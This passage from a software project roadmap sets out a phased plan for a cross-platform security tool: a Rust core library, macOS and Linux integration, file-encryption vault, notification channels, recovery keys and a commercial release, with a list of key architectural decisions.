| Per-profile notification routing | ⬜ Not started | — |
| **Business** | | |
| Choose business model (open source + premium vs direct sale) | ⬜ Not started | — |
| Payment integration (Gumroad/Paddle/Stripe) | ⬜ Not started | — |
| Landing page / marketing site | ⬜ Not started | — |

---

## Execution Timeline

```
Phase 1 (Week 1)       Phase 2 (Weeks 2-4)       Phase 3 (Weeks 5-6)
Mac Portability    -->  Rust Core Library     -->  macOS FFI Integration
  config.toml             threat_intent_parser       Swift <-> Rust bridge
  PathResolver             sensitive_data             Module-by-module swap
  env vars                 prompt_injection
                           file_sanitizer         Phase 4 (Weeks 7-10)
                           email_patterns    -->  Linux Daemon
                           message_patterns         inotify, Thunderbird
                           sender_whitelist         Signal, systemd, tray
                           FFI + cbindgen

                                              Phase 5 (Weeks 11-13)
                                              ElizaOS Features
                                                AES-256-GCM, WASM sandbox

                                              Phase 6 (Weeks 14-15)
                                              Feature Parity + Polish
                                                Shared test suite, TUI, docs

                                              Phase 7 (Weeks 16-18)
                                              Vault — File Protection
                                                AES-256-GCM file encrypt
                                                Touch ID / password auth
                                                NSOpenPanel file picker
                                                User education wizard
                                                FileWatcher integration

                                              Phase 8 (Weeks 19-20)
                                              External Notifications
                                                Telegram Bot API
                                                Discord webhooks
                                                Gmail SMTP email
                                                Setup wizard UI
                                                Severity routing

                                              Phase 9 (Weeks 21-23)
                                              Linux Completion
                                                PAM vault auth + lockout
                                                Vault TUI screen (ratatui)
                                                File browser widget
                                                System tray (ksni)
                                                Rust notification channels

                                              Phase 11 (Week 24)
                                              Recovery Key + Deletion Protection
                                                12-word seed phrase + quiz
                                                Forgot passphrase recovery
                                                macOS immutable flag (uchg)

                                              Phase 12 (Weeks 25-29)
                                              Commercial Release
                                                Notarization + .dmg
                                                Endpoint Security framework
                                                Sparkle auto-update
                                                First-run onboarding
                                                Business model + legal
```

## Key Architectural Decisions

1. **Rust core = static library (.a)** — self-contained, no .dylib to ship
2. **C ABI via cbindgen** — most stable FFI for Swift interop
3. **Same config.toml both platforms** — one format, one parser, one doc set
4. **Pattern modules = pure functions, zero I/O** — trivially testable
5. **Incremental migration** — each Swift module switches independently
6. **MacSec = reference only** — not modified, used for Linux path/service mapping
